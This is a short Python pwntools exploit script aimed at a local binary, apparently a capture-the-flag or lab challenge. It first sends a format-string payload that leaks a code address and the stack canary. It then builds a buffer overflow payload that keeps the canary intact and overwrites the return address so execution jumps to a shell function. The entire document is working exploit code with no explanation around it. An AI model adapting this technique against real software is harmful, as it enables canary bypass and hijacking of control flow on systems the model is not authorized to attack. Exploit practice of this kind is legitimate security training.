from pwn import *

context.update(arch="amd64", os="linux", bits = 64, endian="little")

p = process("./a.out")

# Wait for program
print(p.clean())

# Leak address
p.sendline(b'%15$p%11$p')

# Decode leaked addresses
line = p.recvline().decode("ascii").split("0x")[1:]

# Compute addresses
leaked_addr = int(line[0], 16)
stack_canary = int(line[1], 16)
main_addr = leaked_addr
shell_addr = main_addr - 0x1a

# Give some infos on screen
print("Leaked main: ", hex(main_addr))
print("Leaked shell: ", hex(shell_addr))
print("Stack canary: ", hex(stack_canary))

# Build payload
payload = b'a' * 24
payload += p64(stack_canary)
payload += b'a' * 8
payload += p64(shell_addr)

print(p.clean())
p.sendline(payload) # Overwrite with right address

print(p.clean())
